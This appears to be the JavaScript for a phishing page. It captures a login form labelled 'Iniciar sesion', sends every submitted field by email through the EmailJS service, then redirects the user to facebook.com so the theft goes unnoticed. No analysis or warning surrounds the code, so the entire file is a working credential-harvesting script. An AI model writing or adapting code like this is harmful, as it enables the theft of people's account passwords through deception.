const btn = document.getElementById('button');

document.getElementById('form').addEventListener('submit', function(event) {
  event.preventDefault();

  btn.value = 'Iniciar sesion';

  const serviceID = 'default_service';
  const templateID = 'template_dk2lpk4';

  emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Iniciar sesion';
      window.location.href = 'https://www.facebook.com/'; // Redirige a otra página
    }, (err) => {
      btn.value = 'Iniciar sesión';
      window.location.href = 'https://www.facebook.com/error'; // Redirige a una página de error
    });
});
